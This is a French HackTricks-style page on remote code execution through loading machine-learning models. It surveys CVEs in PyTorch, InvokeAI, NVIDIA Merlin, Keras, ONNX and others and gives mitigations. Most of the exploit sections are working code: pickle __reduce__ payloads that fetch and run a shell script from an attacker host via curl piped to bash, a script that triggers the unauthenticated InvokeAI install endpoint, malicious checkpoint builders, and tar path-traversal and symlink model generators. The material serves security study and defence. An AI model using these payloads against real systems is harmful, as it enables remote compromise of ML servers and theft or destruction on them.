# RCE des modèles

{{#include ../banners/hacktricks-training.md}}

## Charger des modèles menant à une RCE

Les modèles de Machine Learning sont généralement partagés dans différents formats, tels que ONNX, TensorFlow, PyTorch, etc. Ces modèles peuvent être chargés sur les machines des développeurs ou dans des systèmes de production pour être utilisés. Habituellement, les modèles ne devraient pas contenir de code malveillant, mais il existe des cas où le modèle peut être utilisé pour exécuter du code arbitraire sur le système, soit comme fonctionnalité voulue, soit à cause d'une vulnérabilité dans la librairie de chargement de modèles.

Au moment de la rédaction, voici quelques exemples de ce type de vulnérabilités :

| **Framework / Outil**        | **Vulnérabilité (CVE si disponible)**                                                    | **Vecteur RCE**                                                                                                                           | **Références**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malveillant dans le checkpoint du modèle conduit à l'exécution de code (contournant la protection `weights_only`)             | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + téléchargement d'un modèle malveillant provoque une exécution de code ; Java deserialization RCE dans l'API de management       | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint non fiable déclenche le pickle reducer lors de `load_model_trainer_states_from_checkpoint` → exécution de code dans le worker ML | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Charger un modèle depuis du YAML utilise `yaml.unsafe_load` (exécution de code) <br> Charger un modèle avec une couche **Lambda** exécute du code Python arbitraire | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Un modèle `.tflite` spécialement conçu déclenche un integer overflow → corruption du heap (RCE potentiel)                               | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Charger un modèle via `joblib.load` exécute le pickle avec le payload `__reduce__` de l'attaquant                                       | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` autorisait par défaut des tableaux d'objets picklés – un `.npy/.npz` malveillant déclenche une exécution de code            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Le chemin des external-weights d'un modèle ONNX peut sortir du répertoire (lecture de fichiers arbitraires) <br> Une archive tar ONNX malveillante peut écraser des fichiers arbitraires (menant à une RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Un modèle avec un opérateur custom nécessite de charger du code natif de l'attaquant ; des graphes complexes peuvent abuser la logique pour exécuter des calculs non prévus | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | L'utilisation de l'API de chargement de modèles avec `--model-control` activé permet un path traversal relatif pour écrire des fichiers (ex. écraser `.bashrc` pour une RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Un fichier de modèle GGUF malformé provoque des débordements de buffer sur le heap dans le parser, permettant une exécution de code arbitraire sur le système victime | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Un modèle HDF5 (`.h5`) malveillant contenant une couche Lambda exécute toujours du code au chargement (Keras safe_mode ne couvre pas l'ancien format – « downgrade attack ») | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | De nombreux outils ML (par ex., formats de modèles basés sur pickle, `pickle.load` en Python) exécuteront du code arbitraire embarqué dans des fichiers de modèle sauf atténuation | |

De plus, il existe certains modèles basés sur Python pickle comme ceux utilisés par [PyTorch](https://github.com/pytorch/pytorch/security) qui peuvent être utilisés pour exécuter du code arbitraire sur le système s'ils ne sont pas chargés avec `weights_only=True`. Ainsi, tout modèle basé sur pickle peut être particulièrement susceptible à ce type d'attaques, même s'il n'est pas listé dans le tableau ci‑dessus.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` est une interface web open-source populaire pour Stable-Diffusion. Les versions **5.3.1 – 5.4.2** exposent le endpoint REST `/api/v2/models/install` qui permet aux utilisateurs de télécharger et charger des modèles depuis des URLs arbitraires.

En interne, le endpoint appelle finalement :
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Lorsque le fichier fourni est un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` effectue une **désérialisation via pickle**. Parce que le contenu provient directement d'une URL contrôlée par l'utilisateur, un attaquant peut intégrer un objet malveillant avec une méthode `__reduce__` personnalisée à l'intérieur du checkpoint ; la méthode est exécutée **lors de la désérialisation**, conduisant à une **exécution de code à distance (RCE)** sur le serveur InvokeAI.

La vulnérabilité s'est vu attribuer **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation pas à pas

1. Créer un checkpoint malveillant:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hébergez `payload.ckpt` sur un serveur HTTP que vous contrôlez (par ex. `http://ATTACKER/payload.ckpt`).
3. Déclenchez l'endpoint vulnérable (aucune authentification requise) :
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Lorsque InvokeAI télécharge le fichier il appelle `torch.load()` → le gadget `os.system` s'exécute et l'attaquant obtient l'exécution de code dans le contexte du processus InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatise tout le flux.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (paramètre scan par défaut **false**)
•  `/api/v2/models/install` accessible par l'attaquant
•  Le processus dispose des permissions pour exécuter des commandes shell

#### Mitigations

* Mettre à jour vers **InvokeAI ≥ 5.4.3** – le correctif définit `scan=True` par défaut et effectue une analyse de malware avant la désérialisation.
* Lors du chargement de checkpoints de manière programmatique, utilisez `torch.load(file, weights_only=True)` ou le nouveau helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Imposer des allow-lists / signatures pour les sources de modèles et exécuter le service avec le principe du moindre privilège.

> ⚠️ N'oubliez pas que **tout** format Python basé sur pickle (y compris de nombreux fichiers `.pt`, `.pkl`, `.ckpt`, `.pth`) est intrinsèquement dangereux à désérialiser depuis des sources non fiables.

---

Exemple d'atténuation ad hoc si vous devez conserver des versions plus anciennes d'InvokeAI fonctionnant derrière un reverse proxy :
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via `torch.load` non sécurisé (CVE-2025-23298)

Le Transformers4Rec de NVIDIA (partie de Merlin) exposait un chargeur de checkpoint non sécurisé qui appelait directement `torch.load()` sur des chemins fournis par l'utilisateur. Comme `torch.load` s'appuie sur Python `pickle`, un checkpoint contrôlé par un attaquant peut exécuter du code arbitraire via un reducer lors de la désérialisation.

Chemin vulnérable (avant correctif) : `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Pourquoi cela conduit à une RCE : dans Python `pickle`, un objet peut définir un reducer (`__reduce__`/`__setstate__`) qui renvoie un callable et des arguments. Le callable est exécuté lors de l'unpickling. Si un tel objet est présent dans un checkpoint, il s'exécute avant que les weights ne soient utilisés.

Exemple minimal de checkpoint malveillant :
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vecteurs de livraison et rayon d'impact :
- Trojanized checkpoints/models partagés via des repos, buckets, ou artifact registries
- Pipelines automatisés de resume/deploy qui chargent automatiquement des checkpoints
- L'exécution se produit à l'intérieur des training/inference workers, souvent avec des privilèges élevés (par ex., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) a remplacé l'appel direct `torch.load()` par un désérialiseur restreint, allow-listed, implémenté dans `transformers4rec/utils/serialization.py`. Le nouveau loader valide les types/champs et empêche l'invocation d'appels arbitraires pendant le load.

Conseils défensifs spécifiques aux checkpoints PyTorch :
- Ne pas unpickle des données non fiables. Préférez des formats non exécutables comme [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX lorsque c'est possible.
- Si vous devez utiliser la sérialisation PyTorch, assurez-vous que `weights_only=True` (pris en charge dans les versions récentes de PyTorch) ou utilisez un unpickler allow-listed personnalisé similaire au patch Transformers4Rec.
- Imposer la provenance/signatures des modèles et sandboxer la désérialisation (seccomp/AppArmor ; utilisateur non-root ; FS restreint et pas de sortie réseau).
- Surveillez les processus enfants inattendus des services ML au moment du chargement du checkpoint ; tracez l'utilisation de `torch.load()`/`pickle`.

POC et références vulnérables/patch :
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Exemple – création d'un modèle PyTorch malveillant

- Créez le modèle:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Charger le modèle:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD expose un endpoint `resnet` qui désérialise des données contrôlées par l'utilisateur. ZDI a confirmé qu'un attaquant distant peut contraindre une victime à charger une page/fichier malveillant, l'amener à envoyer un blob sérialisé spécialement conçu vers cet endpoint, et déclencher la désérialisation en tant que `root`, entraînant une compromission totale.

Le déroulement de l'exploit reflète l'abus typique de pickle :
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Tout gadget accessible lors de la désérialisation (constructeurs, `__setstate__`, callbacks du framework, etc.) peut être weaponized de la même manière, que le transport soit HTTP, WebSocket, ou un fichier déposé dans un répertoire surveillé.

## Modèles vers Path Traversal

Comme indiqué dans [**ce billet de blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la plupart des formats de modèles utilisés par différents frameworks d'IA sont basés sur des archives, généralement `.zip`. Par conséquent, il peut être possible d'abuser de ces formats pour effectuer des attaques de path traversal, permettant de lire des fichiers arbitraires sur le système où le modèle est chargé.

Par exemple, avec le code suivant vous pouvez créer un modèle qui créera un fichier dans le répertoire `/tmp` lorsqu'il sera chargé :
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, avec le code suivant, vous pouvez créer un modèle qui créera un symlink vers le répertoire `/tmp` lorsqu'il sera chargé :
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Analyse approfondie: Keras .keras deserialization and gadget hunting

Pour un guide ciblé sur .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, and post-fix gadget discovery inside the allowlist, voir:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Références

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
